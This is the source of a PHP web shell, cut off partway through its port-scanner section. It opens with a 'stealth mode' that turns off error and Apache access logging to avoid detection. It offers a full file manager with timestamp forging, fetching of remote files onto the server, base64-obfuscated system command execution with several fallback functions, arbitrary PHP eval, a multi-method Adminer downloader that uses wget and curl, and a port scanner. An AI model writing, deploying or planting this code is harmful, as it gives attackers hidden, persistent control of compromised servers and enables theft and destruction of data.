<?php

// ==========================================
// ANTI-LOG STEALTH MODE (Always Active)
// Disables logging automatically to avoid detection
// ==========================================
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@error_reporting(0);
// Prevent Apache logging (if function exists)
if (function_exists('apache_setenv')) {
    @apache_setenv('no-log', '1');
}
// Override access log (if possible)
if (function_exists('apache_note')) {
    @apache_note('log-request', 'no');
}


ob_start();
session_start();
@set_time_limit(0);
@ini_set('max_execution_time', 0);
error_reporting(0);
// --- Manajemen Direktori ---
if (isset($_POST['go_dir'])) {
    $dir = realpath($_POST['go_dir']);
    if ($dir && is_dir($dir)) {
        $_SESSION['current_dir'] = $dir;
        unset($_SESSION['view_file'], $_SESSION['edit_file']);
    }
} elseif (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = realpath(getcwd());
}
$current_dir = $_SESSION['current_dir'];

// --- Melihat File ---
if (isset($_POST['view_file'])) {
    $vf = realpath($_POST['view_file']);
    if ($vf && is_file($vf) && strpos($vf, $current_dir) === 0) {
        $_SESSION['view_file'] = $vf;
        unset($_SESSION['edit_file']);
    }
}

// --- Mengedit File ---
if (isset($_POST['edit_file'])) {
    $ef = realpath($_POST['edit_file']);
    if ($ef && is_file($ef) && strpos($ef, $current_dir) === 0) {
        $_SESSION['edit_file'] = $ef;
        unset($_SESSION['view_file']);
    }
}

// --- Handle close view file ---
if (isset($_POST['close_view_file'])) {
    unset($_SESSION['view_file']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Touch File/Folder ---
if (isset($_POST['touch_value'], $_POST['save_touch'])) {
    $f = realpath($_POST['save_touch']);
    $timestamp = strtotime($_POST['touch_value']);
    
    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
    $is_current_dir = ($f === realpath($current_dir));
    $is_parent_dir = ($f === realpath(dirname($current_dir)));
    
    if ($f && (is_file($f) || is_dir($f)) && $timestamp !== false && ($is_current_dir || $is_parent_dir || (strpos($f, $current_dir) === 0))) {
        if (touch($f, $timestamp)) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Timestamp updated successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to update timestamp.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file/folder or timestamp format.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Simpan konten file yang diedit
if (isset($_POST['edit_content'], $_POST['save_edit_file'])) {
    $f = realpath($_POST['save_edit_file']);
    if ($f && is_file($f) && is_writable($f) && strpos($f, $current_dir) === 0) {
        // Mengizinkan konten kosong (string kosong)
        $content = $_POST['edit_content']; // Bisa berupa string kosong
        if (file_put_contents($f, $content) !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File edited successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to edit file.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file or not writable.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Penghapusan File dan Direktori ---
function deleteDir($dir) {
    if (!is_dir($dir)) return false;
    $items = scandir($dir);
    $success = true;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            if (!deleteDir($path)) $success = false;
        } else {
            if (!@unlink($path)) $success = false;
        }
    }
    if (!@rmdir($dir)) $success = false;
    return $success;
}

// Tangani penghapusan item tunggal
if (isset($_POST['delete_single_item'])) {
    $user_input_path = trim($_POST['delete_item_name']);
    $path_to_actually_delete = null;

    $potential_path_relative = $current_dir . DIRECTORY_SEPARATOR . $user_input_path;
    $resolved_path_relative = realpath($potential_path_relative);
    $resolved_path_absolute = realpath($user_input_path);

    if ($resolved_path_relative && (is_file($resolved_path_relative) || is_dir($resolved_path_relative)) && strpos($resolved_path_relative, $current_dir) === 0) {
        $path_to_actually_delete = $resolved_path_relative;
    } else {
        if ($resolved_path_absolute && (is_file($resolved_path_absolute) || is_dir($resolved_path_absolute))) {
            $path_to_actually_delete = $resolved_path_absolute;
        }
    }

    if ($path_to_actually_delete) {
        if (is_dir($path_to_actually_delete)) {
            if (deleteDir($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } elseif (is_file($path_to_actually_delete)) {
            if (@unlink($path_to_actually_delete)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete file "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Item not found or not a valid file/folder.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid path or item out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ekstraksi ZIP Individual ---
if (isset($_POST['extract_zip'])) {
    $file_path = realpath($_POST['extract_zip']);
    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'zip' && strpos($file_path, $current_dir) === 0) {
        $zip = new ZipArchive;
        if ($zip->open($file_path) === TRUE) {
            $extract_path = dirname($file_path);
            if ($zip->extractTo($extract_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
            }
            $zip->close();
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open ZIP file "' . htmlspecialchars(basename($file_path)) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid ZIP file or out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ekstraksi TAR.GZ Individual ---
if (isset($_POST['extract_tar'])) {
    $file_path = realpath($_POST['extract_tar']);
    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'gz' && substr($file_path, -7) === '.tar.gz' && strpos($file_path, $current_dir) === 0) {
        try {
            $phar = new PharData($file_path);
            $extract_path = dirname($file_path);
            if ($phar->extractTo($extract_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
            }
            unset($phar);
        } catch (Exception $e) {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract TAR.GZ file: ' . htmlspecialchars($e->getMessage())];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid TAR.GZ file or out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Get File dari URL ---
if (isset($_POST['get_file_url'], $_POST['get_file_name'])) {
    $url = trim($_POST['get_file_url']);
    $filename = trim($_POST['get_file_name']);
    
    if (!empty($url) && !empty($filename)) {
        $file_content = @file_get_contents($url);
        
        if ($file_content !== false) {
            $target_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
            
            if (file_put_contents($target_path, $file_content) !== false) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($filename) . '" downloaded successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to save file "' . htmlspecialchars($filename) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file from URL.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'URL and filename are required.'];
    }
    
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Tindakan Massal ---
if (isset($_POST['bulk_action'], $_POST['items']) && is_array($_POST['items'])) {
    $clean_items = array();
    $success_count = 0;
    $fail_count = 0;
    foreach ($_POST['items'] as $item_path) {
        $r = realpath($item_path);
        if ($r && strpos($r, $current_dir) === 0) {
            $clean_items[] = $r;
        }
    }

    switch ($_POST['bulk_action']) {
        case 'delete':
            foreach ($clean_items as $p) {
                if (is_dir($p) ? deleteDir($p) : @unlink($p)) {
                    $success_count++;
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' item(s) deleted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' item(s) deleted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete any items.'];
            }
            break;
        case 'zip':
            $zip_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.zip';
            $zip = new ZipArchive();

            if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                foreach ($clean_items as $p) {
                    if (is_dir($p)) {
                        $base_name = basename($p);
                        $iterator = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::SELF_FIRST
                        );
                        $zip->addEmptyDir($base_name);

                        foreach ($iterator as $file) {
                            $file_path = $file->getRealPath();
                            $relative_path_in_zip = $base_name . DIRECTORY_SEPARATOR . substr($file_path, strlen($p) + 1);

                            if ($file->isFile()) {
                                $zip->addFile($file_path, $relative_path_in_zip);
                            } elseif ($file->isDir()) {
                                if ($file_path !== $p) {
                                    $zip->addEmptyDir($relative_path_in_zip);
                                }
                            }
                        }
                    } else {
                        $zip->addFile($p, basename($p));
                    }
                }
                if ($zip->close()) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.zip successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create zip archive.'];
                }
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open zip archive.'];
            }
            break;
        case 'tar':
            $tar_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar';
            $tgz_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar.gz';
            try {
                @unlink($tar_file_path); @unlink($tgz_file_path);
                $phar = new PharData($tar_file_path);
                foreach ($clean_items as $p) {
                    $base_name = basename($p);
                    if (is_dir($p)) {
                        // Tambahkan folder utama ke arsip
                        $phar->addEmptyDir($base_name);
                        
                        // Fungsi untuk menambahkan semua item dalam direktori
                        $addItems = function($dir, $baseDir) use (&$phar, &$addItems) {
                            $items = scandir($dir);
                            foreach ($items as $item) {
                                if ($item === '.' || $item === '..') continue;
                                
                                $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
                                $relativePath = $baseDir . DIRECTORY_SEPARATOR . $item;
                                
                                if (is_dir($fullPath)) {
                                    // Tambahkan folder ke arsip
                                    $phar->addEmptyDir($relativePath);
                                    // Rekursif untuk subfolder
                                    $addItems($fullPath, $relativePath);
                                } else {
                                    // Tambahkan file ke arsip
                                    $phar->addFile($fullPath, $relativePath);
                                }
                            }
                        };
                        
                        // Mulai proses penambahan
                        $addItems($p, $base_name);
                    } else {
                        // Untuk file biasa
                        $phar->addFile($p, $base_name);
                    }
                }
                if ($phar->compress(Phar::GZ)) {
                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.tar.gz successfully.'];
                } else {
                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to compress to tar.gz.'];
                }
                unset($phar);
                @unlink($tar_file_path);
            } catch (Exception $e) {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create tar.gz archive: ' . htmlspecialchars($e->getMessage())];
            }
            break;
        case 'unzip':
            $success_count = 0;
            $fail_count = 0;
            foreach ($clean_items as $p) {
                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'zip') {
                    $zip = new ZipArchive;
                    if ($zip->open($p) === TRUE) {
                        $extract_path = dirname($p);
                        if ($zip->extractTo($extract_path)) {
                            $success_count++;
                        } else {
                            $fail_count++;
                        }
                        $zip->close();
                    } else {
                        $fail_count++;
                    }
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
            }
            break;
        case 'untar':
            $success_count = 0;
            $fail_count = 0;
            foreach ($clean_items as $p) {
                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'gz' && substr($p, -7) === '.tar.gz') {
                    try {
                        $phar = new PharData($p);
                        $extract_path = dirname($p);
                        if ($phar->extractTo($extract_path)) {
                            $success_count++;
                        } else {
                            $fail_count++;
                        }
                        unset($phar);
                    } catch (Exception $e) {
                        $fail_count++;
                    }
                } else {
                    $fail_count++;
                }
            }
            if ($success_count > 0 && $fail_count == 0) {
                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
            } elseif ($success_count > 0 && $fail_count > 0) {
                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
            }
            break;
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Pembuatan Folder Baru ---
if (isset($_POST['newfolder_name'])) {
    $new_folder_name = trim($_POST['newfolder_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_folder_name;
    if ($new_folder_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (mkdir($full_path)) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars($new_folder_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create folder "' . htmlspecialchars($new_folder_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid folder name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Pembuatan File Baru ---
if (isset($_POST['create_file'])) {
    $new_file_name = trim($_POST['newfile_name']);
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_file_name;
    if ($new_file_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
        if (file_put_contents($full_path, "") !== false) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($new_file_name) . '" created successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create file "' . htmlspecialchars($new_file_name) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file name or already exists.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Upload File ---
if (isset($_FILES['uploadfile'])) {
    $uf = $_FILES['uploadfile'];
    if ($uf['error'] === UPLOAD_ERR_OK) {
        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($uf['name']);
        if (strpos(realpath(dirname($target_path)), $current_dir) === 0) {
            if (move_uploaded_file($uf['tmp_name'], $target_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($uf['name'])) . '" uploaded successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to upload file "' . htmlspecialchars(basename($uf['name'])) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Upload target path out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'File upload error: ' . $uf['error']];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Download File ---
if (isset($_POST['download'])) {
    $dl = realpath($_POST['download']);
    if ($dl && is_file($dl) && strpos($dl, $current_dir) === 0) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl).'"');
        readfile($dl);
        exit;
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file: Invalid path or out of scope.'];
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// --- Ganti Nama File/Folder ---
if (isset($_POST['rename'], $_POST['rename_new'])) {
    $o = realpath($_POST['rename']);
    $n = basename($_POST['rename_new']);
    if ($o && $n && strpos($o, $current_dir) === 0) {
        $new_path = dirname($o) . DIRECTORY_SEPARATOR . $n;
        if (strpos(realpath(dirname($new_path)), $current_dir) === 0) {
            if (rename($o, $new_path)) {
                $_SESSION['message'] = ['type' => 'success', 'text' => 'Item "' . htmlspecialchars(basename($o)) . '" renamed to "' . htmlspecialchars($n) . '" successfully.'];
            } else {
                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to rename "' . htmlspecialchars(basename($o)) . '".'];
            }
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'New path for rename is out of scope.'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid rename parameters or old path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Ubah Izin File/Folder ---
if (isset($_POST['chmod'], $_POST['chmod_value'])) {
    $t = realpath($_POST['chmod']);
    $cv = $_POST['chmod_value'];
    
    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
    $is_current_dir = ($t === realpath($current_dir));
    $is_parent_dir = ($t === realpath(dirname($current_dir)));
    
    if ($t && preg_match('/^[0-7]{3,4}$/', $cv) && ($is_current_dir || $is_parent_dir || (strpos($t, $current_dir) === 0))) {
        if (chmod($t, octdec($cv))) {
            $_SESSION['message'] = ['type' => 'success', 'text' => 'Permissions for "' . htmlspecialchars(basename($t)) . '" changed to ' . htmlspecialchars($cv) . ' successfully.'];
        } else {
            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to change permissions for "' . htmlspecialchars(basename($t)) . '".'];
        }
    } else {
        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid chmod parameters or path out of scope.'];
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- Eksekusi Perintah (Universal Windows/Linux Support) ---
$cmdout = '';
if (isset($_POST['command'])) {
    $command = base64_decode($_POST["command"]);
    
    $exec_functions_closures = [
        'system' => function($cmd) { ob_start(); system($cmd); return ob_get_clean(); },
        'exec' => function($cmd) { $output = ''; exec($cmd, $output); return implode("\n", (array)$output); },
        'passthru' => function($cmd) { ob_start(); passthru($cmd); return ob_get_clean(); },
        'shell_exec' => function($cmd) { return shell_exec($cmd); },
        'popen' => function($cmd) { 
            $pipe = popen($cmd, 'r'); 
            $output = ''; 
            if (is_resource($pipe)) {
                while (!feof($pipe)) $output .= fread($pipe, 1024);
                pclose($pipe);
            }
            return $output;
        },
        'proc_open' => function($cmd) use ($current_dir) { 
            $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $process = proc_open($cmd, $descriptorspec, $pipes, $current_dir);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $out = stream_get_contents($pipes[1]); fclose($pipes[1]);
                $err = stream_get_contents($pipes[2]); fclose($pipes[2]);
                proc_close($process);
                return "Output:\n$out\nError:\n$err";
            }
            return false;
        }
    ];
    
    $output = '';
    foreach ($exec_functions_closures as $func_name => $func_callback) {
        if (function_exists($func_name)) {
            $output = $func_callback($command);
            if (!empty($output) && strlen(trim($output)) > 0) {
                break;
            }
        }
    }
    
    if (empty($output)) $output = "Command executed but no output returned or all functions disabled.";
    // Base64 encode output for stealth (auto-decode on load)
    $encoded_output = base64_encode($output);
    $cmdout = '<pre id="cmdOutput" style="background:#111;border:1px solid #444;padding:10px;color:#fff;white-space:pre-wrap;word-break:break-all;"></pre>';
    $cmdout .= '<script>(function(){var d=atob("' . $encoded_output . '");document.getElementById("cmdOutput").textContent=d;})();</script>';
}

// --- PHP Eval (Code Execution) ---
if (isset($_POST['php_eval_code'])) {
    $php_code = base64_decode($_POST['php_eval_code']);
    
    ob_start();
    $eval_result = '';
    try {
        $eval_result = eval($php_code);
    } catch (Exception $e) {
        $eval_result = 'Error: ' . $e->getMessage();
    } catch (Throwable $t) {
        $eval_result = 'Error: ' . $t->getMessage();
    }
    $output = ob_get_clean();
    
    if ($eval_result !== null && $eval_result !== false) {
        $output .= "\n\n[Return Value]: " . var_export($eval_result, true);
    }
    
    if (empty($output)) $output = "PHP code executed but no output returned.";
    
    // Base64 encode output for stealth
    $encoded_output = base64_encode($output);
    $cmdout = '<pre id="cmdOutput" style="background:#111;border:1px solid #ff6666;padding:10px;color:#fff;white-space:pre-wrap;word-break:break-all;"></pre>';
    $cmdout .= '<script>(function(){var d=atob("' . $encoded_output . '");document.getElementById("cmdOutput").textContent=d;})();</script>';
}

// --- GET ADMINER - Download with all PHP GET methods ---
if (isset($_POST['tool_action']) && $_POST['tool_action'] === 'get_adminer') {
    $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $target_file = $current_dir . '/adminer.php';
    $results = [];
    $success = false;
    
    // Method 1: file_get_contents
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $results[] = "[+] Trying file_get_contents...";
        try {
            $data = @file_get_contents($adminer_url);
            if ($data !== false && strlen($data) > 1000) {
                file_put_contents($target_file, $data);
                $success = true;
                $results[] = "[✓] SUCCESS via file_get_contents";
            } else {
                $results[] = "[-] Failed: empty or invalid data";
            }
        } catch (Exception $e) {
            $results[] = "[-] Failed: " . $e->getMessage();
        }
    } else {
        $results[] = "[!] file_get_contents not available (allow_url_fopen=off)";
    }
    
    // Method 2: cURL
    if (!$success && function_exists('curl_init')) {
        $results[] = "[+] Trying cURL...";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $adminer_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($data !== false && $http_code == 200 && strlen($data) > 1000) {
            file_put_contents($target_file, $data);
            $success = true;
            $results[] = "[✓] SUCCESS via cURL (HTTP $http_code)";
        } else {
            $results[] = "[-] Failed: HTTP $http_code or empty response";
        }
    } else if (!$success) {
        $results[] = "[!] cURL not available";
    }
    
    // Method 3: fopen + fread
    if (!$success && ini_get('allow_url_fopen')) {
        $results[] = "[+] Trying fopen/fread...";
        try {
            $fp = @fopen($adminer_url, 'r');
            if ($fp) {
                $data = '';
                while (!feof($fp)) {
                    $data .= fread($fp, 8192);
                }
                fclose($fp);
                if (strlen($data) > 1000) {
                    file_put_contents($target_file, $data);
                    $success = true;
                    $results[] = "[✓] SUCCESS via fopen/fread";
                } else {
                    $results[] = "[-] Failed: insufficient data";
                }
            } else {
                $results[] = "[-] Failed: could not open URL";
            }
        } catch (Exception $e) {
            $results[] = "[-] Failed: " . $e->getMessage();
        }
    }
    
    // Method 4: stream_context_create + file_get_contents
    if (!$success && function_exists('stream_context_create') && ini_get('allow_url_fopen')) {
        $results[] = "[+] Trying stream_context_create...";
        $opts = [
            'http' => [
                'method' => 'GET',
                'timeout' => 30,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        $context = stream_context_create($opts);
        $data = @file_get_contents($adminer_url, false, $context);
        if ($data !== false && strlen($data) > 1000) {
            file_put_contents($target_file, $data);
            $success = true;
            $results[] = "[✓] SUCCESS via stream_context_create";
        } else {
            $results[] = "[-] Failed: could not fetch data";
        }
    }
    
    // Method 5: http_get (PECL)
    if (!$success && function_exists('http_get')) {
        $results[] = "[+] Trying pecl_http (http_get)...";
        try {
            $response = http_get($adminer_url);
            if ($response) {
                $info = http_parse_message($response);
                if ($info && strlen($info->body) > 1000) {
                    file_put_contents($target_file, $info->body);
                    $success = true;
                    $results[] = "[✓] SUCCESS via pecl_http";
                }
            }
        } catch (Exception $e) {
            $results[] = "[-] Failed: " . $e->getMessage();
        }
    }
    
    // Method 6: Socket (fsockopen)
    if (!$success && function_exists('fsockopen')) {
        $results[] = "[+] Trying fsockopen (raw socket)...";
        $host = 'github.com';
        $path = '/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
        $port = 443;
        $timeout = 30;
        
        $fp = @fsockopen('ssl://' . $host, $port, $errno, $errstr, $timeout);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "User-Agent: Mozilla/5.0\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            
            $data = '';
            while (!feof($fp)) {
                $data .= fgets($fp, 128);
            }
            fclose($fp);
            
            // Extract body from HTTP response
            $pos = strpos($data, "\r\n\r\n");
            if ($pos !== false) {
                $body = substr($data, $pos + 4);
                // Handle chunked encoding
                if (strpos($data, 'Transfer-Encoding: chunked') !== false) {
                    $body = decode_chunked($body);
                }
                if (strlen($body) > 1000) {
                    file_put_contents($target_file, $body);
                    $success = true;
                    $results[] = "[✓] SUCCESS via fsockopen";
                } else {
                    $results[] = "[-] Failed: insufficient data (redirects may occur)";
                }
            } else {
                $results[] = "[-] Failed: invalid HTTP response";
            }
        } else {
            $results[] = "[-] Failed: $errstr ($errno)";
        }
    }
    
    // Method 7: exec/system (wget/curl command)
    if (!$success) {
        $results[] = "[+] Trying system commands (wget/curl)...";
        $commands = [
            "wget -q -O \"$target_file\" \"$adminer_url\" 2>&1",
            "curl -sL -o \"$target_file\" \"$adminer_url\" 2>&1",
            "wget --no-check-certificate -q -O \"$target_file\" \"$adminer_url\" 2>&1",
            "curl -k -sL -o \"$target_file\" \"$adminer_url\" 2>&1"
        ];
        foreach ($commands as $cmd) {
            @exec($cmd, $output, $return_var);
            if (file_exists($target_file) && filesize($target_file) > 1000) {
                $success = true;
                $results[] = "[✓] SUCCESS via command: " . substr($cmd, 0, 20) . "...";
                break;
            }
        }
        if (!$success) {
            $results[] = "[-] Failed: wget/curl commands failed";
        }
    }
    
    // Final result
    if ($success) {
        $file_size = filesize($target_file);
        $results[] = "";
        $results[] = "=" . str_repeat("=", 50);
        $results[] = "[✓] Adminer downloaded successfully!";
        $results[] = "    File: adminer.php";
        $results[] = "    Size: " . number_format($file_size) . " bytes";
        $results[] = "    URL: " . dirname($_SERVER['REQUEST_URI']) . "/adminer.php";
        $results[] = "=" . str_repeat("=", 50);
    } else {
        $results[] = "";
        $results[] = "[✗] All methods failed. Check connectivity and permissions.";
    }
    
    $output = implode("\n", $results);
    $encoded_output = base64_encode($output);
    $cmdout = '<pre id="cmdOutput" style="background:#111;border:1px solid ' . ($success ? '#66ff66' : '#ff6666') . ';padding:10px;color:#fff;white-space:pre-wrap;word-break:break-all;"></pre>';
    $cmdout .= '<script>(function(){var d=atob("' . $encoded_output . '");document.getElementById("cmdOutput").textContent=d;})();</script>';
}

// Helper function for chunked encoding
function decode_chunked($str) {
    $decoded = '';
    while ($str) {
        $pos = strpos($str, "\r\n");
        if ($pos === false) break;
        $len = hexdec(substr($str, 0, $pos));
        if ($len === 0) break;
        $decoded .= substr($str, $pos + 2, $len);
        $str = substr($str, $pos + 2 + $len + 2);
    }
    return $decoded;
}

// --- SCAN PORT - Port Scanner for localhost ---
if (isset($_POST['tool_action']) && $_POST['tool_action'] === 'scan_port') {
    $target = isset($_POST['scan_host']) ? $_POST['scan_host'] : '127.0.0.1';
    $ports_input = isset($_POST['scan_ports']) ? $_POST['scan_ports'] : '22,80,443,3306,8080';
    $timeout = isset($_POST['scan_timeout']) ? intval($_POST['scan_timeout']) : 2;
    
    // Parse ports (comma-separated or range)
    $ports = [];
    foreach (explode(',', $ports_input) as $part) {
        $part = trim($part);
        if (strpos($part, '-') !== false) {
            list($start, $end) = explode('-', $part);
            $ports = array_merge($ports, range(intval($start), intval($end)));
        } else {
            $ports[] = intval($part);
        }
    }
    $ports = array_unique($ports);
    sort($ports);
    
    $results = [];
    $results[] = "╔" . str_repeat("═", 58) . "╗";
    $results[] = "║" . str_pad(" PORT SCANNER", 58) . "║";
    $results[] = "╠" . str_repeat("═", 58) . "╣";
    $results[] = "║ Target: " . str_pad($target, 48) . "║";
    $results[] = "║ Ports:  " . str_pad(count($ports) . " ports", 48) . "║";
    $results[] = "║ Timeout:" . str_pad($timeout . " sec", 48) . "║";
    $results[] = "╚" . str_repeat("═", 58) . "╝";
    $results[] = "";
    
    $open_ports = [];
    $closed_ports = [];
    
    foreach ($ports as $port) {
        $connection = @fsockopen($target, $port, $errno, $errstr, $timeout);
        if ($connection) {
            fclose($connection);
            $open_ports[] = $port;
            $service = get_service_name($port);
            $results[] = "[OPEN]   Port $port/tcp - $service";
        } else {
            $closed_ports[] = $port;
        }
    }
    
    $results[] = "";
    $results[] = str_repeat("-", 60);
    $results[] = "SUMMARY:";
    $results[] = "  Open ports:   " . count($open_ports) . "/" . count($ports);
